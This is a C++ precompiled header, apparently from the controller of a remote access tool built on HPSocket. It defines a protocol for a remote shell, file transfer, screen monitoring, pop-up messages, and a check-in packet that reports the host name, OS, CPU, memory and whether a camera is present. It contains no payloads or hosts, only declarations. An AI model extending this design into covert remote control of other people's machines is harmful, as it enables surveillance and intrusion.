// pch.h: 这是预编译标头文件。
// 下方列出的文件仅编译一次，提高了将来生成的生成性能。
// 这还将影响 IntelliSense 性能，包括代码完成和许多代码浏览功能。
// 但是，如果此处列出的文件中的任何一个在生成之间有更新，它们全部都将被重新编译。
// 请勿在此处添加要频繁更新的文件，这将使得性能优势无效。

#ifndef PCH_H
#define PCH_H

// 添加要在此处预编译的标头
#include "framework.h"

#include <iostream>

#include "./HPSocket/HPSocket.h"
#include <afxcontrolbars.h>

#ifdef _WIN64
	#ifdef _DEBUG
		#pragma comment(lib, "./HPSocket/x64/HPSocket_UD.lib")
	#else
		#pragma comment(lib, "./HPSocket/x64/HPSocket_U.lib")
	#endif
#else
	#ifdef _DEBUG
		#pragma comment(lib, "./HPSocket/x86/HPSocket_UD.lib")
	#else
		#pragma comment(lib, "./HPSocket/x86/HPSocket_U.lib")
	#endif
#endif


#define xmalloc(s) HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,(s))
#define xfree(p)   HeapFree(GetProcessHeap(),0,(p))



enum COMMAND_ID {
	CRYPTO_KEY,				// 传递通信密钥和IV
	LOGIN,					// 上线包

	ECHO,					// 测试发包

	// 远程SHELL
	SHELL_CONNECT,			// 被控端新建一条子socket用于远程SHELL
	SHELL_EXECUTE,			// 执行SHELL
	SHELL_CLOSE,			// 关闭SHELL


	// 文件上传
	FILE_UPLOAD_CONNECT,	// 新建一条socket连接用于文件传输，每条socket只传一个文件就关闭
	FILE_UPLOAD_INFO,		// 文件大小、分片数等信息
	FILE_UPLOAD_DATA,		// 文件上传的数据包（非最后一个）
	FILE_UPLOAD_DATA_TAIL,	// 文件上传的数据包，最后一个分片
	FILE_UPLOAD_CLOSE,		// 关闭文件传输


	// 文件下载
	FILE_DOWNLOAD_CONNECT,
	FILE_DOWNLOAD_DATA,
	FILE_DOWNLOAD_DATA_TAIL,
	FILE_DOWNLOAD_CLOSE,


	// 文件管理
	FILE_MANAGE_CONNECT,	



	SCREEN_MONITOR,			// 屏幕监控
	MESSAGE_BOX,			// 弹窗
};




#define LOGIN_PACKET_BODY_LENGTH (50+30+80+30+1)

typedef struct _LOGIN_INFO {
	CHAR			szHostName[50];		// 主机名
	CHAR			szOsVersion[30];	// 操作系统版本
	CHAR			szCpuType[80];		// CPU型号、主频等
	CHAR			szMemoryInfo[30];	// 内存
	BOOL			bHaveCamera;		// 是否有摄像头

	VOID StructToBuffer(PBYTE pbBuffer) {
		memcpy(pbBuffer, szHostName, 50);
		memcpy(pbBuffer + 50, szOsVersion, 30);
		memcpy(pbBuffer + 80, szCpuType, 80);
		memcpy(pbBuffer + 160, szMemoryInfo, 30);
		pbBuffer[50 + 30 + 80 + 30] = (BYTE)bHaveCamera;
	}

	_LOGIN_INFO() {
		ZeroMemory(&szHostName, 50);
		ZeroMemory(&szOsVersion, 30);
		ZeroMemory(&szCpuType, 80);
		ZeroMemory(&szMemoryInfo, 30);
		bHaveCamera = false;
	}

	_LOGIN_INFO(PBYTE pbBuffer) {
		memcpy(szHostName, pbBuffer, 50);
		memcpy(szOsVersion, pbBuffer + 50, 30);
		memcpy(szCpuType, pbBuffer + 80, 80);
		memcpy(szMemoryInfo, pbBuffer + 160, 30);
		bHaveCamera = pbBuffer[190];
	}
}LOGIN_INFO, *PLOGIN_INFO;



#include <strsafe.h>





enum DIALOG_TYPE {
	SHELL_REMOTE_DLG,
	FILE_TRANSFOR_DLG
};


typedef struct _DIALOG_INFO {
	DIALOG_TYPE eType;			// 对话框的类型，比如远程SHELL的对话框，文件传输的对话框
	HANDLE hHandle;				// 所打开的对话框的句柄
	LPVOID pClassAddress;		// 比如这个对话框是CShellRemote创建的，那么这项就放对应CShellRemote对象的地址，用于delete
}DIALOG_INFO, *PDIALOG_INFO;



#define CRYPTO_KEY_PACKET_LENGTH 33
#define CRYPTO_KEY_PACKET_TOKEN_FOR_MAIN_SOCKET (0xAB)
#define CRYPTO_KEY_PACKET_TOKEN_FOR_CHILD_SOCKET (0xCD)



#ifndef QWORD
	#define QWORD int64_t
#endif



#endif //PCH_H
